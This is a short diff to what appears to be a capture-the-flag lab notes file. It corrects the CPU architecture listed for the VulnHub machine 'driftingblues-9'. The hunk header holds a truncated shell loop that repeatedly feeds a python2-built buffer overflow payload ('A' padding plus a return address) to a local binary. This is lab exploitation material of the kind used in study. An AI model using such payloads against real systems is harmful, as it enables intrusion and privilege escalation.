@@ -369,7 +369,7 @@ for i in $(seq 1 10000); do ./input "$(python2 -c 'print "A"*171 + "\xd0\xc3\xff
 **driftingblues-9**: 
 - website: `https://www.vulnhub.com/entry/driftingblues-9-final,695/`
 - IP: `192.168.64.37`
-- CPU Arch: `x86_amd_64`
+- CPU Arch: `i386`
 - CPU Cores: `2`
 
 ---
